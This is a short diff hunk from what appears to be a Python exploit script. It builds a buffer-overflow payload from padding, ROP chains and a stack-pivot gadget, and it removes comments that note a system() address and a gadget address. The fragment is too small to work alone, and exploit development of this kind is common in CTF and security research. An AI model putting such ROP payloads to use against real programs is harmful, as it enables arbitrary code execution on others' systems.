@@ -229,10 +229,6 @@ payload += b"A" * (tot_head - espadd_offset - len(ropchain) - len(ropchain_loop)
 payload += b'XDXD' 
 
 
-#0x409a75 -> system()
-#target
-
-#0x00401089 : add esp, 0x1000 ; pop ebp ; ret
 payload += p32(add_esp)
 
 
